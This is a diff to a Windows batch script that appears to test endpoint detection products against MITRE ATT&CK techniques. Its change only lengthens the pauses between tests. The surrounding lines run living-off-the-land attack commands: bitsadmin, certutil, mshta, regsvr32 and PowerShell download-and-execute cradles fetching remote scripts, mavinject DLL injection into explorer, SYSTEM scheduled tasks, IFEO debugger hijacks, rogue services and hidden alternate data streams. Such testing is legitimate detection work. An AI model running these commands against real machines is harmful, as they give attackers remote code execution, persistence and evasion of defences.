@@ -83,7 +83,7 @@ echo %time% %date%: [+] T1140 - Decoding AllTheThings.dll file with Certutil
 start "" cmd /c certutil -f -decode fi.b64 AllTheThings.dll >nul
 echo Command Excuted: certutil -f -decode fi.b64 AllTheThings.dll
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1197 - Testing bitsadmin download
 start "" cmd /c bitsadmin.exe /transfer "JobName" https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt "%cd%\Default_File_Path.ps1"
@@ -93,32 +93,32 @@ start "" cmd /c powershell -c "Start-BitsTransfer -Priority foreground -Source h
 echo Command Excuted:powershell -c "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt -Destination Default_File_Path.ps1
 echo Execution Finished at %time% %date%
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1118 - Testing InstallUtil x86"
 start "" cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
 echo Execution Finished at %time% %date%
 echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1118 - Testing InstallUtil x64
 start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
 echo Execution Finished at %time% %date%
 echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1170 - Testing mshtha
 start "" cmd /c mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
 echo Execution Finished at %time% %date%
 echo Command Excuted: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1086 - Testing powershell cradle - WebClient
 start "" cmd /c powershell -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
 echo Execution Finished at %time% %date%
 echo Command Excuted: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
-timeout 2
+timeout 5
 
 
 echo %time% %date% [+] T1121 - Testing regsvcs
@@ -136,7 +136,7 @@ start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllT
 echo Execution Finished at %time% %date%
 echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1121 - Testing regasm
 start "" cmd /c C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThings.dll
@@ -146,7 +146,7 @@ start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U Al
 echo Execution Finished at %time% %date%
 echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1121 - Testing regasm x64
 start "" cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
@@ -156,14 +156,14 @@ start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U Al
 echo Execution Finished at %time% %date%
 echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1117 -  Testing regsvr32
 start "" cmd /c regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll
 echo Execution Finished at %time% %date%
 echo Command Excuted: regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1127 - Testing MSBuild
 
@@ -180,14 +180,14 @@ start "" cmd /c C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFil
 echo Execution Finished at %time% %date%
 echo Command Excuted: C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1047 - Testing wmic download
 start "" cmd /c wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
 echo Execution Finished at %time% %date%
 echo Command Excuted: wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1128 - Testing netsh.exe dll exec 
 start "" cmd /c netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    
@@ -204,68 +204,68 @@ echo Command Excuted: netsh interface portproxy add v4tov4 listenport=8080 liste
 echo Command Excuted: netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
 echo Command Excuted: netsh trace stop
 
-timeout 2
+timeout 5
  
 echo %time% %date% [+] T1085 - Testing rundll32 execution
 start "" cmd /c rundll32 AllTheThings.dll,EntryPoint
 echo Execution Finished at %time% %date%
 echo Command Excuted: rundll32 AllTheThings.dll,EntryPoint
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1085 - Testing rundll32 download & exec
 start "" cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
 echo Execution Finished at %time% %date%
 echo Command Excuted: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1085 - Testing rundll32 exec
 start "" cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}
 echo Execution Finished at %time% %date%
 echo Command Excuted: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1130 - Testing certutil download 
 start "" cmd /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1  
 echo Execution Finished at %time% %date%
 echo Command Excuted: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1
-timeout 2
+timeout 5
 
 echo %time% %date% [+] T1191 - Testing cmstp download
 start "" cmd /c cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf
 echo Execution Finished at %time% %date%
 echo Command Excuted: cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf
-timeout 2
+timeout 5
 echo %time% %date% [+] T1202 - Indirect Command Execution
 start "" cmd /c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
 echo Execution Finished at %time% %date%
 echo Command Excuted: forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
-timeout 2
+timeout 5
 echo %time% %date% [+] T1028 - Testing Windows Remoting exec
 start "" cmd /c winrm qc -q 
 start "" cmd /c winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
 echo Execution Finished at %time% %date%
 echo Command Excuted: winrm qc -q 
 echo Command Excuted: winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
-timeout 2
+timeout 5
 echo %time% %date% [+] T1053 - Adding Scheduled Task exec ONLOGON
 start "" cmd /c schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System" /f
 echo Execution Finished at %time% %date%
 echo Command Excuted: schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System"
-timeout 2
+timeout 5
 echo %time% %date% [+] T1216 - Signed Script Proxy Execution
 start "" cmd /c cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct
 echo Execution Finished at %time% %date%
 echo Command Excuted: cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct
-timeout 2
+timeout 5
 echo %time% %date% [+] T1218 / T1055 - Signed Binary Proxy Execution
 start "" cmd /c  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\system32\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
 echo Command Excuted: for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\system32\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
 start "" cmd /c  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\SysWOW64\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
 echo Command Excuted:  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\SysWOW64\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
 echo Execution Finished at %time% %date%
-timeout 2
+timeout 5
 echo %time% %date% [+] T1033 - System Owner/User Discovery
 start "" cmd.exe /c whoami
 start "" wmic useraccount get /ALL
@@ -276,14 +276,14 @@ echo Command Excuted: cmd.exe /C whoami
 echo Command Excuted: wmic useraccount get /ALL
 echo Command Excuted: cmd.exe /C net group "domain administrators" /domain
 
-timeout 2
+timeout 5
 echo %time% %date% [+] T1158 - Hiding data in ADS
 echo "test123 > 12.txt
 echo "test" > 12.txt:12
 echo Execution Finished at %time% %date%
 echo Command Excuted: echo "test123 > 12.txt
 echo Command Excuted: echo "test123 > 12.txt
-timeout 2
+timeout 5
 echo %time% %date% [+] T1183 - Exec via File Execution Options
 
 start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "C:\windows\system32\calc.exe"
@@ -294,14 +294,14 @@ echo Execution Finished at %time% %date%
 echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "calc.exe"
 echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
 echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v MonitorProcess /d "calc.exe"
-timeout 2
+timeout 5
 echo %time% %date% [+] T1096 - NTFS File Attributes
 type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
 start "" cmd /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test
 echo Execution Finished at %time% %date%
 echo Command Excuted: type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
 echo Command Excuted: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test
-timeout 2
+timeout 5
 
 echo **********************************************
 echo *      Testing LOLBAS PAYLOADS               *
@@ -313,44 +313,44 @@ start "" cmd /c msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/mast
 echo Execution Finished at %time% %date%
 echo Command Excuted: msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true 
 echo Command Excuted: msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true
-timeout 2
+timeout 5
 echo %time% %date% [+] Testing diskshadow exec
 echo exec calc.exe > diskshadow.txt
 start "" cmd /c  diskshadow.exe /s diskshadow.txt
 echo Execution Finished at %time% %date%  
 echo Command Excuted: exec calc.exe > diskshadow.txt
 echo Command Excuted: diskshadow.exe /s diskshadow.txt
-timeout 2
+timeout 5
 echo %time% %date% [+] Testing Esentutl.exe download & exec
 start "" cmd /c  esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o  
 start "" cmd /c  adrestore.exe   
 echo Execution Finished at %time% %date%  
 echo Command Excuted: esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o
 echo Command Excuted: adrestore.exe
-timeout 2
+timeout 5
 echo %time% %date% [+] Testing replace.exe download & exec
 start "" cmd /c replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
 start "" cmd /c adrestore2.exe   
 echo Execution Finished at %time% %date% 
 echo Command Excuted: replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
 echo Command Excuted: adrestore2.exe  
-timeout 2
+timeout 5
 echo %time% %date% [+] Testing SyncAppvPublishingServer.vbs download & exec
 start "" cmd /c  C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
 echo Execution Finished at %time% %date% 
 echo Command Excuted: C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
-timeout 2
+timeout 5
 echo %time% %date% [+] Testing HH.exe download
 REM HH.exe does not handle HTTPS
 start "" cmd /c  HH.exe http://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
 echo Execution Finished at %time% %date% 
 echo Command Excuted: HH.exe http://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
-timeout 2
+timeout 5
 echo %time% %date% Testing ieexec.exe download & execute"exec"
 start "" cmd /c  ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
 echo Execution Finished at %time% %date% 
 echo Command Excuted: ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
-timeout 2
+timeout 5
 echo %time% %date% [+] Testing Setupapi driever installation & exec
 echo ^; DRIVER.INF > calc.inf
 echo ^; Copyright (c) Microsoft Corporation.  All rights reserved. >> calc.inf
@@ -370,17 +370,17 @@ echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe
 start "" cmd /c rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
 echo Execution Finished at %time% %date% 
 echo Command Excuted: rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
-timeout 2
+timeout 5
 
 echo %time% %date% [+] Testing Shdocvw exec via rundll32
 echo [InternetShortcut] > C:\windows\temp\url.url
 echo URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
-start "" cmd /c  rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
+start "" cmd /c rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
 echo Execution Finished at %time% %date%
 echo Command Excuted: [InternetShortcut] > C:\windows\temp\url.url
 echo Command Excuted: URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
 echo Command Excuted: rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
-timeout 2
+timeout 5
 
 echo %time% %date% [+] Testing csc exec
 
@@ -398,18 +398,18 @@ echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /o
 echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
 echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs
 echo Command Excuted: payload.exe 
-timeout 2
+timeout 5
 echo %time% %date% [+] Testing advpack exec
 start "" cmd /c rundll32.exe advpack.dll,RegisterOCX calc.exe
 echo Execution Finished at %time% %date%
 echo Command Excuted: rundll32.exe advpack.dll,RegisterOCX calc.exe
-timeout 2
+timeout 5
 echo %time% %date% [+] Testing Scriptrunner exec
 start "" cmd /c scriptrunner.exe -appvscript calc.exe   
 echo Execution Finished at %time% %date%
 echo Command Excuted: scriptrunner.exe -appvscript calc.exe
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] Testing SC exec
 start "" cmd /c sc create evilservice binPath= "C:\windows\system32\calc.exe" DisplayName= "evilservice" start= auto     
@@ -418,14 +418,14 @@ echo Execution Finished at %time% %date%
 echo Command Excuted: sc create evilservice binPath= "C:\windows\system32\cmd.exe /c calc.exe" DisplayName= "evilservice" start= auto  
 echo Command Excuted: sc start evilservice
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] Testing Register-cimprovider exec
 start "" cmd /c Register-cimprovider -path "AllTheThings.dll"   
 echo Execution Finished at %time% %date%
 echo Command Excuted: Register-cimprovider -path "AllTheThings.dll"   
 
-timeout 2
+timeout 5
 
 echo %time% %date% [+] Testing control.exe exec
 start "" cmd /c control.exe AllTheThings.dll
